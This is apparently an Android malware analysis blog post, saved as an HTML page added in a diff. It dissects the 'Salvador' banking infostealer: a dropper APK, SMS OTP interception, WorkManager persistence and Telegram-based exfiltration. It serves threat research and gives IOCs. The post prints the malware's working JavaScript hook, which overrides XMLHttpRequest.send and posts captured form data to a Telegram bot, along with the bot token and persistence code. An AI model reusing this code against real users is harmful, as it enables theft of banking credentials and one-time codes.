@@ -1,0 +1,507 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="noindex, nofollow">
+<title>Salvador Stealer Analysis | YaxyZ&#39;s Blog</title>
+<meta name="keywords" content="">
+<meta name="description" content="
+Android Malware analysis
+Salvador Stealer - Android malware analysis
+By YaxyZ
+
+
+Sample information
+
+  
+      
+          Indicator
+          Value
+      
+  
+  
+      
+          Filename
+          Malware_SalvidorStealer_INDUSLND_BANK_E_KYC.apk
+      
+      
+          SHA256
+          21504d3f2f3c8d8d231575ca25b4e7e0871ad36ca6bbb825bf7f12bfc3b00f5a
+      
+      
+          Package Name
+          com.indusvalley.appinstall
+      
+  
+
+Overview
+The Salvador infostealer is an Android malware designed to intercept Indian banking credentials and OTP Tokens by hooking into the device web rendering engine. It utilizes modern Android APIs to remain persistent even when the user attempts to close the application. Additionally, it implements a custom SMS Broadcast receiver to catch live OTP tokens received by SMS which is then used by the malicious actor to impersonate the user.">
+<meta name="author" content="">
+<link rel="canonical" href="http://localhost:1313/posts/salvador-stealer-analysis/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.de53c6895643b27ff99bc9d4e97daf7c414a91bd9528fb369b52ac936b923e22.css" integrity="sha256-3lPGiVZDsn/5m8nU6X2vfEFKkb2VKPs2m1Ksk2uSPiI=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/posts/salvador-stealer-analysis/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .toc {
+                background: var(--entry);
+            }
+        }
+
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+
+    </style>
+</noscript>
+<script>
+    if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="YaxyZ&#39;s Blog (Alt + H)">YaxyZ&#39;s Blog</a>
+            <div class="logo-switches">
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://localhost:1313/" title="Welcome">
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/posts" title="Blog">
+                    <span>Blog</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/contact" title="Contact">
+                    <span>Contact</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://github.com/YaxyZ" title="GitHub">
+                    <span>GitHub</span>&nbsp;
+                    <svg fill="none" shape-rendering="geometricPrecision" stroke="currentColor" stroke-linecap="round"
+                        stroke-linejoin="round" stroke-width="2.5" viewBox="0 0 24 24" height="12" width="12">
+                        <path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"></path>
+                        <path d="M15 3h6v6"></path>
+                        <path d="M10 14L21 3"></path>
+                    </svg>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="http://localhost:1313/">Home</a>&nbsp;»&nbsp;<a href="http://localhost:1313/posts/">Posts</a></div>
+    <h1 class="post-title entry-hint-parent">
+      Salvador Stealer Analysis
+      <span class="entry-hint" title="Draft">
+        <svg xmlns="http://www.w3.org/2000/svg" height="35" viewBox="0 -960 960 960" fill="currentColor">
+          <path
+            d="M160-410v-60h300v60H160Zm0-165v-60h470v60H160Zm0-165v-60h470v60H160Zm360 580v-123l221-220q9-9 20-13t22-4q12 0 23 4.5t20 13.5l37 37q9 9 13 20t4 22q0 11-4.5 22.5T862.09-380L643-160H520Zm300-263-37-37 37 37ZM580-220h38l121-122-18-19-19-18-122 121v38Zm141-141-19-18 37 37-18-19Z" />
+        </svg>
+      </span>
+    </h1>
+    <div class="post-meta"><span title='2026-04-15 19:43:22 +0300 IDT'>April 15, 2026</span>
+
+</div>
+  </header> 
+  <div class="post-content"><p><img loading="lazy" src="/images/image3.png"></p>
+<p>Android Malware analysis</p>
+<h1 id="salvador-stealer---android-malware-analysis">Salvador Stealer - Android malware analysis</h1>
+<h3 id="by-yaxyz">By YaxyZ</h3>
+<p><img loading="lazy" src="/images/image12.png"></p>
+<p><img loading="lazy" src="/images/image4.png"></p>
+<h1 id="sample-information">Sample information</h1>
+<table>
+  <thead>
+      <tr>
+          <th>Indicator</th>
+          <th>Value</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>Filename</td>
+          <td>Malware_SalvidorStealer_INDUSLND_BANK_E_KYC.apk</td>
+      </tr>
+      <tr>
+          <td>SHA256</td>
+          <td>21504d3f2f3c8d8d231575ca25b4e7e0871ad36ca6bbb825bf7f12bfc3b00f5a</td>
+      </tr>
+      <tr>
+          <td>Package Name</td>
+          <td>com.indusvalley.appinstall</td>
+      </tr>
+  </tbody>
+</table>
+<h1 id="overview">Overview</h1>
+<p>The Salvador infostealer is an Android malware designed to intercept Indian banking credentials and OTP Tokens by hooking into the device web rendering engine. It utilizes modern Android APIs to remain persistent even when the user attempts to close the application. Additionally, it implements a custom SMS Broadcast receiver to catch live OTP tokens received by SMS which is then used by the malicious actor to impersonate the user.</p>
+<h3 id="1-entry-point-webview-injection">1. Entry Point: WebView Injection</h3>
+<p>The core of the theft occurs within an Android <strong>WebView</strong> (an in-app browser). The malware uses the js function <em>Eval</em> to inject a malicious payload that &ldquo;monkey patches&rdquo; the standard web environment.</p>
+<ul>
+<li><strong>The Hook:</strong> It overwrites the global <strong>XMLHttpRequest.prototype.send</strong> function. This is the primary method used by websites to send data (API calls, form submissions) to their servers.</li>
+<li><strong>The Interception:</strong> By sitting between the user and the legitimate server, the malware captures all <strong>POST</strong> data (passwords, cookies, session tokens) before it is encrypted by the website&rsquo;s standard HTTPS transmission.</li>
+</ul>
+<h3 id="2-persistence-the-unkillable-service">2. Persistence: The &ldquo;Unkillable&rdquo; Service</h3>
+<p>To ensure the theft continues indefinitely, the malware implements a watchdog mechanism using the <strong>Android WorkManager API</strong>.</p>
+<ul>
+<li><strong>Task Removal Trigger:</strong> The malware overrides the <strong>onTaskRemoved</strong> method. This is a specific lifecycle event triggered when a user &ldquo;swipes away&rdquo; the app from their recent tasks.</li>
+<li><strong>The 1-Second Loop:</strong> Instead of shutting down, the app schedules a <strong>OneTimeWorkRequest</strong> to restart its malicious services after a 1 second delay. This makes the malware effectively immune to manual termination by the user.</li>
+</ul>
+<h3 id="3-exfiltration-telegram-bot-api">3. Exfiltration: Telegram Bot API</h3>
+<p>Unlike older malware that required a complex Command &amp; Control server, this infostealer leverages the <strong>Telegram Bot API</strong> as its backend.</p>
+<ul>
+<li><strong>Stealthy Transmission:</strong> Using a hardcoded Bot Token and Chat ID, the malware sends the intercepted data as a standard JSON message to a private Telegram chat controlled by the attacker.</li>
+<li><strong>Network Obfuscation:</strong> Because Telegram is a legitimate service, this traffic often bypasses basic network firewalls and does not raise suspicion in standard data usage logs.</li>
+</ul>
+<h3 id="4-otp-interception-sms-forwarding">4. OTP Interception: SMS Forwarding</h3>
+<p>The malware implemented a mechanism to capture OTP authentication tokens received by the banking login 2FA. It uses a permission given by the user to utilize an sms broadcast receiver to capture received SMS’s.</p>
+<ul>
+<li><strong>Dual-Channel SMS Theft:</strong> The Trojan intercepts all incoming text messages. It simultaneously logs the full message history to the attacker’s web server via <strong>HTTP POST</strong> request and forwards the OTPs to a malicious phone number via SMS.</li>
+<li><strong>Dynamic Command &amp; Control:</strong> The malware is not static. it performs an <strong>HTTP GET</strong> request to an attacker controlled URL to retrieve a &ldquo;Master Phone Number&rdquo;. This allows the hacker to remotely change the destination of stolen codes without needing to reinfect the device, or even automate the process.</li>
+</ul>
+<hr>
+<h2 id="malware-flow-chart">Malware flow chart:</h2>
+<p><img loading="lazy" src="/images/image1.png"></p>
+<h1 id="iocs">IOC’s</h1>
+<table>
+  <thead>
+      <tr>
+          <th>Indicator</th>
+          <th>Type</th>
+          <th>Value</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>Stage 1 Dropper</td>
+          <td>SHA256</td>
+          <td>21504d3f2f3c8d8d231575ca25b4e7e0871ad36ca6bbb825bf7f12bfc3b00f5a</td>
+      </tr>
+      <tr>
+          <td>Stage 2 Payload</td>
+          <td>SHA256</td>
+          <td>7950cc61688a5bddbce3cb8e7cd6bec47eee9e38da3210098f5a5c20b39fb6d8</td>
+      </tr>
+      <tr>
+          <td>Malicious Telegram Bot</td>
+          <td>URL</td>
+          <td>https://api[.]telegram[.]org/bot$7931012454:AAGdsBp3w5fSE9PxdrwNUopr3SU86mFQieE/sendMessage</td>
+      </tr>
+      <tr>
+          <td>Phishgin page</td>
+          <td>URL</td>
+          <td>t15[.]muletipushpa[.]cloud/page/</td>
+      </tr>
+      <tr>
+          <td>OTP interception 1</td>
+          <td>URL</td>
+          <td><a href="https://t15.muletipushpa.cloud/post.php">https://t15.muletipushpa.cloud/post.php</a></td>
+      </tr>
+      <tr>
+          <td>OTP interception 2</td>
+          <td>URL</td>
+          <td>https://t15[.]muletipushpa[.]cloud/json/number[.]php</td>
+      </tr>
+  </tbody>
+</table>
+<h1 id="anti-analysis-techniques">Anti Analysis Techniques</h1>
+<h2 id="badpack">BadPack</h2>
+<p>As part of the Static Analysis, I began using apktool and JADX to decompile the malware but I was met with a strange error:</p>
+<p><img loading="lazy" src="/images/image2.png"></p>
+<p>The following error <em>invalid CEN header (bad compression method)</em> Would not allow me to decompile the file.</p>
+<p>I found research conducted by Unit 421 - <em>‘Beware of BadPack: One Weird Trick Being Used Against Android Devices’</em> . Feel free to read their research and learn more about the technique.</p>
+<p>In short, BadPack is an anti-analysis technique used by Android malware authors to intentionally corrupt APK (ZIP) headers. By mismatching compression methods or sizes between the Local File Header and the Central Directory File Header , malware breaks standard analysis pipelines, reverse-engineering tools, and ZIP parsers. However, the Android runtime ignores these anomalies and executes the malicious payload anyway.</p>
+<p>I tested it by throwing the  apk into HxD and inspected the hex bytes of the compression method to be 0xA307 (Unknown compression method).
+<img loading="lazy" src="/images/image11.png"></p>
+<p>To reverse this mechanism I have developed a tool based on their research that patches the altered bytes and output’s the fixed apk. Feel free to check it out <a href="https://github.com/YaxyZ/BadpackDetectAndFix">Here</a>2.</p>
+<hr>
+<h2 id="string-obfuscation">String Obfuscation</h2>
+<p>The malware uses a string obfuscation algorithm to hide plain text and evade detection. It uses a two-stage deobfuscation routine that combines Hexadecimal-to-Binary conversion with a cyclic XOR cipher.
+<img loading="lazy" src="/images/image10.png"></p>
+<p>I reconstructed the decode function in python:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">deobf</span>(string):
+</span></span><span style="display:flex;"><span>    hexString <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;0123456789ABCDEF&#34;</span>
+</span></span><span style="display:flex;"><span>    KEY <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;npmanager&#34;</span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    baos <span style="color:#f92672">=</span> bytearray()
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, len(string), <span style="color:#ae81ff">2</span>):
+</span></span><span style="display:flex;"><span>        baos<span style="color:#f92672">.</span>append(hexString<span style="color:#f92672">.</span>index(string[i]) <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">|</span> hexString<span style="color:#f92672">.</span>index(string[i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>]))
+</span></span><span style="display:flex;"><span>    b <span style="color:#f92672">=</span> bytearray(baos)
+</span></span><span style="display:flex;"><span>    blenth <span style="color:#f92672">=</span> len(b)
+</span></span><span style="display:flex;"><span>    keyLen <span style="color:#f92672">=</span> len(KEY)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i2 <span style="color:#f92672">in</span> range(blenth):
+</span></span><span style="display:flex;"><span>        b[i2] <span style="color:#f92672">=</span> (b[i2] <span style="color:#f92672">^</span> KEY[i2 <span style="color:#f92672">%</span> keyLen])
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> b<span style="color:#f92672">.</span>decode()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(deobf(<span style="color:#e6db74">&#34;0F1E09130108034B020B0200081D120E0A1C402228222B2831202D3D3D3E&#34;</span>))
+</span></span></code></pre></div><p>As an addition to this script, I created another script that replaces the decode method text with the plain text by invoking the decode function.</p>
+<h2 id="network-connectivity-check">Network Connectivity Check</h2>
+<p>The malware implements a simple check to make sure there is an active internet connection. if it cant reach the internet, it would not be able to contact the malicious actor servers so it just stays quiet to avoid leaving a trail.</p>
+<p><img loading="lazy" src="/images/image8.png"></p>
+<p>The isNetworkConnected method is quite simple:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">boolean</span> <span style="color:#a6e22e">isNetworkConnected</span>() {
+</span></span><span style="display:flex;"><span>        ConnectivityManager cm <span style="color:#f92672">=</span> (ConnectivityManager) getSystemService(<span style="color:#e6db74">&#34;connectivity&#34;</span>);
+</span></span><span style="display:flex;"><span>        NetworkInfo activeNetwork <span style="color:#f92672">=</span> cm.<span style="color:#a6e22e">getActiveNetworkInfo</span>();
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> activeNetwork <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span> <span style="color:#f92672">&amp;&amp;</span> activeNetwork.<span style="color:#a6e22e">isConnected</span>();
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><p>This check forces us to jump through hoops, set up a fake network just to trick the code into showing its true colors during the analysis.</p>
+<hr>
+<h1 id="malware-flow-analysis">Malware flow analysis</h1>
+<h2 id="stage-1---dropper">Stage 1 - Dropper</h2>
+<p>The malicious execution begins with &ldquo;Stage 1 - Dropper,&rdquo; which is immediately initiated when the application is launched for the very first time. This initial stage is triggered by launching the main activity: <strong>com.indusvalley.appinstall.IndusKimkc</strong>.</p>
+<p>Upon creation, the <strong>IndusKimkc</strong> activity tries to decept the user to achieve further access. It immediately displays a user-facing dialog[1], the purpose of which is to prompt the victim into authorizing the installation of an additional package (malicious APK payload). Concurrently with presenting this prompt, the application programmatically starts an Android PackageInstaller session. The objective of this session is to install a secondary package, which is contained within the initial application&rsquo;s assets and is named <strong>base.apk</strong>.</p>
+<p><img loading="lazy" src="/images/image5.png"><br>
+[1] User Facing dialog</p>
+<p>Another technique the malicious actor uses is setting the manifest configuration of the activity launch to <strong>android:launchMode</strong> to <strong>singleTop</strong>.</p>
+<p>When the PackageInstaller session successfully completes the installation of the base.apk, it broadcasts a result that, due to the singleTop launch mode, does not create a new instance of the activity but instead sends a new Intent to the existing, running instance.</p>
+<p>This subsequent action triggers the execution of the activity&rsquo;s <strong>onNewIntent()</strong> function. Within the function, the application contains logic to inspect and process the incoming Intent. Specifically. it checks the result of the package installation process - If the check confirms that the base.apk package was successfully installed, the dropper component has achieved its goal. The application then uses the <strong>startActivity()</strong> call to initiate the payload, effectively handing off control to the newly installed second stage.</p>
+<h2 id="stage-2---malicious-payload">Stage 2 - Malicious Payload</h2>
+<p>The second stage of malware focuses on persistence, automated data exfiltration via Telegram, and SMS OTP interception. The malware has the package name <strong>com.deer.lion</strong>.</p>
+<h3 id="1-permission-acquisition--initial-checks">1. Permission Acquisition &amp; Initial Checks</h3>
+<p>Upon execution, the malware performs a connectivity check as a basic anti-analysis gate. Once a connection is confirmed, it verifies the necessary permissions for its core functionality - SMS interception and exfiltration.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">boolean</span> <span style="color:#a6e22e">checkPermissions</span>(Context context) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> checkSelfPermission(<span style="color:#e6db74">&#34;android.permission.RECEIVE_SMS&#34;</span>) <span style="color:#f92672">==</span> 0 <span style="color:#f92672">&amp;&amp;</span> checkSelfPermission(<span style="color:#e6db74">&#34;android.permission.INTERNET&#34;</span>) <span style="color:#f92672">==</span> 0 <span style="color:#f92672">&amp;&amp;</span> checkSelfPermission(<span style="color:#e6db74">&#34;android.permission.SEND_SMS&#34;</span>) <span style="color:#f92672">==</span> 0;
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><p><strong>Logic:</strong> If <strong>checkPermissions</strong> returns false, the malware invokes the standard Android permission dialog until the user agrees.</p>
+<p><strong>Security Implication:</strong> By requesting <strong>RECEIVE_SMS</strong> and <strong>SEND_SMS</strong>, the malware gains the ability to perform MITM attack on received OTP tokens (2FA) by reading incoming SMS’s.</p>
+<hr>
+<h3 id="2-javascript-injection--webview-interception">2. JavaScript Injection &amp; WebView Interception</h3>
+<p>If permissions are granted, the malware initializes a WebView[2] and loads the remote URL:</p>
+<p><code>t15[.]muletipushpa[.]cloud/page/</code></p>
+<p><img loading="lazy" src="/images/image9.png"><br>
+[2] WebView displays phishing page</p>
+<p>To exfiltrate data entered or handled within this WebView, it injects a malicious JavaScript snippet.</p>
+<h4 id="obfuscation--evasion">Obfuscation &amp; Evasion</h4>
+<p>The script utilizes <strong>decodeURIComponent</strong> and <strong>eval</strong> to mask the C2 infrastructure. Decoding these strings reveals the Telegram Bot API configuration:</p>
+<ul>
+<li><strong>Bot Token:</strong> 7931012454:AAGdsBp3w5fSE9PxdrwNUopr3SU86mFQieE</li>
+<li><strong>Chat ID:</strong> -1002480016657</li>
+</ul>
+<h4 id="the-hooking-mechanism">The Hooking Mechanism</h4>
+<p>The script hooks the <strong>XMLHttpRequest.prototype.send</strong> function, ensuring that every time the web application sends data to a server, a copy is forwarded to the attacker&rsquo;s Telegram bot:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span>(<span style="color:#66d9ef">function</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">originalSend</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">XMLHttpRequest</span>.<span style="color:#a6e22e">prototype</span>.<span style="color:#a6e22e">send</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">XMLHttpRequest</span>.<span style="color:#a6e22e">prototype</span>.<span style="color:#a6e22e">send</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">data</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">botToken</span> <span style="color:#f92672">=</span> eval(decodeURIComponent(<span style="color:#e6db74">&#39;%22%37%39%33%31%30%31%32%34%35%34%3a%41%41%47%64%73%42%70%33%77%35%66%53%45%39%50%78%64%72%77%4e%55%6f%70%72%33%53%55%38%36%6d%46%51%69%65%45%22&#39;</span>));
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">chatId</span> <span style="color:#f92672">=</span> eval(decodeURIComponent(<span style="color:#e6db74">&#39;%22%2d%31%30%30%32%34%38%30%30%31%36%36%35%37%22&#39;</span>));
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">telegramUrl</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`https://api.telegram.org/bot</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">botToken</span><span style="color:#e6db74">}</span><span style="color:#e6db74">/sendMessage`</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">telegramMessage</span> <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">chat_id</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">chatId</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">text</span><span style="color:#f92672">:</span> <span style="color:#e6db74">`Intercepted Data Sent:\n</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">data</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>,
+</span></span><span style="display:flex;"><span>            };
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">fetch</span>(<span style="color:#a6e22e">telegramUrl</span>, {
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">method</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;POST&#39;</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">headers</span><span style="color:#f92672">:</span> {
+</span></span><span style="display:flex;"><span>                    <span style="color:#e6db74">&#39;Content-Type&#39;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;application/json&#39;</span>
+</span></span><span style="display:flex;"><span>                },
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">body</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>(<span style="color:#a6e22e">telegramMessage</span>),
+</span></span><span style="display:flex;"><span>            });
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">e</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">error</span>(<span style="color:#e6db74">&#34;Error sending to Telegram:&#34;</span>, <span style="color:#a6e22e">e</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">originalSend</span>.<span style="color:#a6e22e">apply</span>(<span style="color:#66d9ef">this</span>, <span style="color:#a6e22e">arguments</span>);
+</span></span><span style="display:flex;"><span>    };
+</span></span><span style="display:flex;"><span>})();
+</span></span></code></pre></div><hr>
+<h3 id="3-background-service-fitzgerald">3. Background Service: Fitzgerald</h3>
+<p>To ensure the theft continues outside the active UI session, the malware launches a foreground service named <strong>Fitzgerald</strong>.</p>
+<p><strong>Execution Flow:</strong> The malware utilizes <strong>startForegroundService()</strong> to grant the process higher priority, making it less likely to be killed by the Android operating system and creates a fake ‘customer support’ notification message:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> Notification <span style="color:#a6e22e">createNotification</span>() {
+</span></span><span style="display:flex;"><span>        Notification.<span style="color:#a6e22e">Builder</span> builder <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Notification.<span style="color:#a6e22e">Builder</span>(<span style="color:#66d9ef">this</span>, <span style="color:#e6db74">&#34;foreground_service_channel&#34;</span>);
+</span></span><span style="display:flex;"><span>        String strDecode <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Customer support&#34;</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> builder.<span style="color:#a6e22e">setContentTitle</span>(strDecode).<span style="color:#a6e22e">setContentText</span>(strDecode).<span style="color:#a6e22e">setSmallIcon</span>(R.<span style="color:#a6e22e">drawable</span>.<span style="color:#a6e22e">ic_launcher_background</span>).<span style="color:#a6e22e">setPriority</span>(1).<span style="color:#a6e22e">setOngoing</span>(<span style="color:#66d9ef">true</span>).<span style="color:#a6e22e">build</span>();
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><p><strong>State Tracking:</strong> It writes a boolean flag to a SharedPreferences file named <strong>service_prefs</strong> to track the service&rsquo;s running state across reboots or crashes.</p>
+<p><strong>Initialization:</strong> Following the standard Android Service Lifecycle, <strong>onCreate</strong> initializes an <strong>IntentFilter</strong> specifically designed to listen for <strong>android.provider.Telephony.SMS_RECEIVED</strong> broadcasts. We would investigate the sms broadcast receiver later.</p>
+<hr>
+<h3 id="4-persistence-mechanism-mauricio--workmanager">4. Persistence Mechanism: Mauricio &amp; WorkManager</h3>
+<p>The Salvador stealer implements a robust persistence layer to counter the user manually closing the application. It overrides the <code>onTaskRemoved</code> callback, which triggers when the user swipes the app away from the &ldquo;Recents&rdquo; menu.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#a6e22e">@Override</span> <span style="color:#75715e">// android.app.Service</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">onTaskRemoved</span>(Intent rootIntent) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">super</span>.<span style="color:#a6e22e">onTaskRemoved</span>(rootIntent);
+</span></span><span style="display:flex;"><span>        WorkRequest serviceRestartWork <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> OneTimeWorkRequest.<span style="color:#a6e22e">Builder</span>(Mauricio.<span style="color:#a6e22e">class</span>).<span style="color:#a6e22e">setInitialDelay</span>(1L, TimeUnit.<span style="color:#a6e22e">SECONDS</span>).<span style="color:#a6e22e">build</span>();
+</span></span><span style="display:flex;"><span>        WorkManager.<span style="color:#a6e22e">getInstance</span>(getApplicationContext()).<span style="color:#a6e22e">enqueue</span>(serviceRestartWork);
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><p><strong>Persistence Logic:</strong> When the task is removed, a OneTimeWorkRequest is scheduled via the WorkManager API.</p>
+<p><strong>Watchdog implementation:</strong> After a 1-second delay, the system executes the Mauricio class. This class acts as a watchdog, containing a simple logic gate that recreates the Intent to restart the Fitzgerald service.</p>
+<h3 id="5-malicious-sms-broadcast-receiver-implementation">5. Malicious SMS Broadcast Receiver Implementation</h3>
+<p>The analysis of the second stage reveals a sophisticated SMS interception and exfiltration mechanism. After establishing persistence via the <strong>Fitzgerald</strong> service and ensuring a background presence, the malware focuses on capturing incoming SMS data.</p>
+<h4 id="sms-interception-logic">SMS Interception Logic</h4>
+<p>The malware registers an IntentFilter for <strong>android.provider.Telephony.SMS_RECEIVED</strong>. When an SMS arrives, the receiver executes the following flow[3]:</p>
+<p><img loading="lazy" src="/images/image14.png"><br>
+[3] Receiver execution flow</p>
+<p><strong>PDU Parsing:</strong> The malware extracts the raw Protocol Data Unit (PDU) from the intent. It specifically checks the &ldquo;format&rdquo; extra to determine if the message is in 3gpp (GSM/LTE) or 3gpp2 (CDMA) format to ensure successful decoding.</p>
+<p><strong>Data Structuring:</strong> The intercepted message is stored in a Map object containing the Sender ID, Message Body, and Timestamp.</p>
+<h4 id="dual-path-exfiltration-mechanism">Dual-Path Exfiltration Mechanism</h4>
+<p>Once the SMS is captured, the malware triggers two parallel processes: <strong>Bradford</strong> (SMS Forwarding) and <strong>Randall</strong> (Web Exfiltration).</p>
+<h5 id="a-the-bradford-function-sms-forwarding">A. The Bradford Function (SMS Forwarding)</h5>
+<p>This function attempts to turn the victim&rsquo;s device into an automated SMS forwarder by the following order:</p>
+<ol>
+<li><strong>Dynamic number Fetching:</strong> It performs an HTTP GET request to <strong>https://t15[.]muletipushpa[.]cloud/json/number[.]php</strong> to retrieve the attacker phone number.</li>
+<li><strong>Configuration Storage:</strong> The returned phone number is saved in SharedPreferences under the file <strong>‘Salvador’</strong> with the key <strong>forwardingNumber</strong>.</li>
+<li><strong>Forwarding:</strong> The malware then uses the <strong>sendSMS()</strong> method to forward the stolen message directly to this attacker-controlled number.</li>
+</ol>
